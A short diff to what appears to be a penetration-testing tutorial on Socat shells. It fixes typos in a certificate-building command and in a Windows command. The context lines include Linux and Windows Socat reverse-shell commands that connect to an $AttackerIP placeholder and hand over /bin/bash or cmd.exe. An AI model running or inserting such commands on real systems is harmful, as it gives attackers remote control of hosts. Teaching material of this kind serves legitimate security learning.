@@ -103,7 +103,7 @@ openssl req -newkey rsa:2048 -nodes -keyout cert.key -x509 -days 1000 -subj '/CN
 This will create the key file named `cert.key` and the certificate file named `cert.crt`. In order to use them with Socat they must be transformed into a `.pem` file which is done by concatenating the two files via the following command:
 
 ```bash
-cat cert.key cert.crt L > cert.pem
+cat cert.key cert.crt > cert.pem
 ```
 
 From here the `cert.pem` file can be used for the Socat shell.
@@ -182,7 +182,7 @@ socat OPENSSL:$AttackerIP:$Port,verify=0 EXEC:/bin/bash
 The command to prompt a Windows target to reach out to the listener is broadly the same as the Linux one except what follows the `EXEC:` statement:
 
 ```powershell
-OPENSSL:$AttackerIP:$Port,verify=0 EXEC:'cmd.exe',pipes
+socat OPENSSL:$AttackerIP:$Port,verify=0 EXEC:'cmd.exe',pipes
 ```
 
 * `$AttackerIP` and `$Port` may be shell session variables or simply written in (E.g. `OPENSSL:192.168.111.222:443`)
